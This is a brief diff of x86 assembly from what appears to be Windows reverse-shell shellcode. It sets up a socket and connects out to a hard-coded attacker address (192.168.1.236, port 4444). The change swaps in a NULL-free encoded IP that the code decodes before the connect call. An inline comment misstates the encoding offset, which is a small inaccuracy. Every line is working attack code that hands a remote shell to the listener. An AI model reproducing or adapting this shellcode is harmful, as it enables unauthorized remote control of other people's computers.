@@ -126,8 +126,7 @@ callWSASocketA:
 
 callConnect:
     ;set up sockaddr_in
-    ;mov edx, 0xed02a9c1             ;the IP plus 0x11111111 so we avoid NULLs (IP=192.168.1.236)
-    mov edx, 0x0401090b
+    mov edx, 0xed02a9c1             ;the IP plus 0x11111111 so we avoid NULLs (IP=192.168.1.236)
     sub edx, 0x01010101             ;subtract from edx to obtain the real IP
     push edx                        ;push sin_addr
     push word 0x5c11                ;0x115c = (port 4444)
